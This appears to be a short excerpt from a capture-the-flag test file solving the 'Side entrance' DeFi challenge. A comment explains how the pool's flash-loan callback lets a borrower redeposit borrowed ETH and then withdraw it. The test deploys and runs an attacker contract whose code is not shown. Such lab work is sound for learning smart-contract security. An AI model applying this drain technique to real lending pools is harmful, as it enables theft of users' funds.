...
describe("[Challenge] Side entrance", function () {
  ...
  /**
   * SideEntranceLenderPool has a vulnerability where anyone can deposit ETH into the pool
   * via `execute` callback. We can redeposit the ETH we get from the pool and simply withdraw.
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    const sideEntranceLenderAttackerFactory = await ethers.getContractFactory(
      "SideEntranceLenderAttacker",
      player
    );
    const sideEntranceLenderAttacker =
      await sideEntranceLenderAttackerFactory.deploy(pool.address);

    await sideEntranceLenderAttacker.attack();
  });
